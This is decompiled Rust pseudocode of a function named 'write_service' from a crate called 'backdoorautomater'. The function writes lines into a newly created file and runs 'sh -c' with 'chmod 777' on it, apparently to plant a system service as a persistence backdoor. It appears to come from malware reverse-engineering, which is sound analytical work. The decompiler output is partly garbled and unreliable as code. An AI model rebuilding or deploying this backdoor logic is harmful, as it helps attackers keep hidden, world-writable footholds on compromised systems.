fn backdoorautomater::modifyservice::write_service(a0: &struct24, a1: &struct24, a2: i64) -> u64 {
    let v0: std::fs::File;  // [bp-0x1dc]
    let v1: u64;  // [bp-0x1d0]
    let v2: u64;  // [bp-0x1c8]
    let v3: u128;  // [bp-0x1b8]
    let v4: u64;  // [bp-0x1a8]
    let v5: alloc::borrow::Cow<str>;  // [bp-0x1a0], Other Possible Types: alloc::vec::Vec<u8, alloc::alloc::Global>, core::result::Result<std::process::Output, std::io::error::Error>
    let v6: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x1a0]
    let v7: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x1a0]
    let v8: u128;  // [bp-0x168]
    let v9: u64;  // [bp-0x158]
    let v10: struct56;  // [bp-0x148], Other Possible Types: u128
    let v11: u64;  // [bp-0x140]
    let v12: u64;  // [bp-0x138]
    let v13: u64;  // [bp-0x128]
    let v14: &str;  // [bp-0x108], Other Possible Types: core::result::Result<std::fs::File, std::io::error::Error>, struct149, struct24
    let v15: u128;  // [bp-0x108]
    let v16: u32;  // [bp-0x104]
    let v17: &str;  // [bp-0xf8], Other Possible Types: u64
    let v18: u64;  // [bp-0xf8]
    let v19: u128;  // [bp-0xf0]
    let v20: u64;  // [bp-0xe0]
    let v23: Result<(), &BOT>;  // rbp
    let v25: i64;  // rax
    let v26: u64;  // rdx
    let v29: core::slice::iter::Iter<std::backtrace::BacktraceSymbol>;  // rax:rdx

    v17 = *((a1 + 16) as &i64);
    v15 = *(a1 as &i128);
    v19 = *(a0 as &i128);
    v20 = *((a0 + 16) as &i64);
    v7 = alloc::str::join_generic_copy(&v15, 2, 1, 0);
    v4 = v7.len;
    v3 = *(&v7.buf.cap as &i128);
    v14 = "chmod 777 ";
    v17 = *((&v3 as &char + 8) as &i128);
    v5 = alloc::str::join_generic_copy(&v15, 2, 1, 0);
    v9 = v5.len;
    v8 = *(&v5.buf.cap as &i128);
    v14 = std::fs::File::create(&v3, a2);
    match v14 {
        Err(_) => {
            return v23;
        },
        Ok(v0) => {
            v29 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(a2);
            v1 = v29.end_or_len;
            v25 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v29.ptr.pointer);
            v17 = v17;
            if v25 {
                loop {
                    v15 = *((v25 + 8) as &i128) as u128;
                    v17 = "\n";
                    v6 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                    v26 = v6.len;
                    v12 = v6.len;
                    v10 = *(&v6.buf.cap as &i128) as u128;
                    v23 = std::io::Write::write_all(&v0, v11, v26);
                    if let Err(_) = v23 {
                        break;
                    }
                    v25 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v29.ptr.pointer);
                    v17 = v18;
                    if !v25 {
                        goto LABEL_455c9e;
                    }
                }
            }
LABEL_455c9e:
            v14 = std::process::Command::new("sh");
            v5 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v14, "-c"), &v8));
            v10 = core::result::Result<T,E>::expect(&v5, "src/modifyservice.rs");
            v5 = alloc::string::String::from_utf8_lossy(v13, *((&v10.field_32 as &char + 8) as &i64));
            v14 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v5), a2);
            v2 = v17;
            *(&v29.ptr.pointer as &i128) = *(&v14.field_0 as &i128);
            backdoorautomater::sanitizer::sanitize_system_command(&v29.ptr.pointer);
            return 0;
        },
    }
}
